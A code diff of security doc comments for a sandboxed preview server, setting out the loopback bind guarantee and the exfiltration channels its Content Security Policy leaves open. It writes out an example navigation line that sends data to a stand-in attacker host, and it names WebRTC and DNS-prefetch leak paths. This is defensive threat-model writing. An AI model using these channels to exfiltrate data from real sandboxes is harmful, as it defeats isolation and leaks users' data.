@@ -17,11 +17,20 @@
  * the tokenless guest origin to the whole LAN, an origin with no credential to check and
  * therefore no gate to fail closed. {@link sandboxBindHost} now clamps the requested host
  * inside {@link startSandboxServer}, so the guarantee is a property of the sandbox origin
- * itself rather than of any one call site: no present or future caller can bind the guest
- * off-loopback by passing the wrong host. The accepted consequence, recorded here because
- * it is a real cost and not an oversight: in exposed mode a REMOTE browser resolves the
- * injected `__QS_SANDBOX_ORIGIN__` against its own loopback, so report visualizations
- * render only on the host machine and remote viewers get an empty preview pane.
+ * itself rather than of any one call site: no caller can bind the guest off-loopback by
+ * passing the wrong host. ONE seam sits outside that guarantee, named here rather than
+ * left implied — `StartCoreOptions.startSandboxServer` lets a caller (today: tests)
+ * replace this factory wholesale, and `startCore` does not check the origin it gets back.
+ * The clamp therefore covers every real boot, but an injected factory is trusted, not
+ * verified.
+ *
+ * The accepted consequence, recorded here because it is a real cost and not an oversight:
+ * in exposed mode a REMOTE browser resolves the injected `__QS_SANDBOX_ORIGIN__` against
+ * its OWN loopback, so a CHAT answer carrying a chart does not render off-host. What is
+ * lost is the chart plus the prose narration it displaces (`decideMessageView` suppresses
+ * the bubble for a chart-bearing answer); the generated SQL and the full result table
+ * still render, since `ChatQueryRun` is not gated on the chart. The Report tab is
+ * unaffected — it draws in-app with Recharts, not in this sandbox.
  */
 
 import { deriveOpenUrl, sandboxBindHost } from "./binding.ts";
@@ -68,9 +77,11 @@ export type SandboxServer = {
  * 'none'` is the egress block (no fetch/XHR/WebSocket/EventSource can leave); and
  * `base-uri 'none'` / `form-action 'none'` close the remaining exfil vectors.
  *
- * What `connect-src 'none'` does NOT cover, stated plainly because the phrase "egress
- * block" reads stronger than it is (DW-47): it governs scripted REQUESTS, not scripted
- * NAVIGATION. A hostile guest bundle cannot `fetch` the pushed `FrozenData` anywhere, but
+ * What `connect-src 'none'` does NOT cover, because the phrase "egress block" reads
+ * stronger than it is (DW-47) — and read the list below as the channels we have actually
+ * reasoned through, NOT as a proof that no others exist: it governs scripted REQUESTS,
+ * not scripted NAVIGATION. A hostile guest bundle cannot `fetch` the pushed `FrozenData`
+ * anywhere, but
  * it can still assign `window.location = "http://attacker.example/?" + data` and carry
  * that payload off-machine in the URL of its own same-frame navigation. Nothing in THIS
  * policy stops that: `form-action` covers form submission, `base-uri` covers base-tag
@@ -78,6 +89,16 @@ export type SandboxServer = {
  * list does not stop it either — a frame may navigate ITSELF without
  * `allow-top-navigation`; that token only governs navigating the TOP-level browsing
  * context. The dedicated directive, `navigate-to`, was dropped from CSP before it shipped.
+ *
+ * Navigation is not the ONLY channel this policy leaves open, and saying so matters more
+ * than the tidiness of a single named residual — a future "we blocked navigation, the
+ * residual is closed" would be wrong. `RTCPeerConnection` is governed by CSP3's `webrtc`
+ * directive, which is not set here and does NOT fall back to `default-src`, so a hostile
+ * bundle can raise a peer connection and leak through STUN/TURN candidates without
+ * navigating at all. `<link rel="dns-prefetch">` / `rel="preconnect"` are speculative
+ * connections no current fetch directive constrains, which buys a low-bandwidth DNS-label
+ * channel. Both survive the `frame-src` mitigation below, which is a NAVIGATION control
+ * and does nothing for either.
  *
  * One mitigation DOES already apply and is worth stating so the residual is not read as
  * wider than it is: the EMBEDDER's policy governs navigations of a nested browsing
@@ -91,7 +112,10 @@ export type SandboxServer = {
  * on a different origin from the guest it would be protecting, and its enforcement on
  * child self-navigation is engine behavior no test in this repo pins. A containment
  * argument that depends on a control nobody wrote for the purpose and nobody asserts is a
- * residual, not a guarantee.
+ * residual, not a guarantee. It also quietly depends on `allow-popups` staying ABSENT from
+ * the iframe's `sandbox` token list (`sandbox-host.ts`): add that token and `window.open`
+ * reopens the channel in an auxiliary browsing context, which `frame-src` does not govern
+ * at all.
  *
  * That residual is ACCEPTED, not overlooked. The threat model here is a compromised or
  * malicious guest BUNDLE, and the only thing it ever receives is the output of a query the
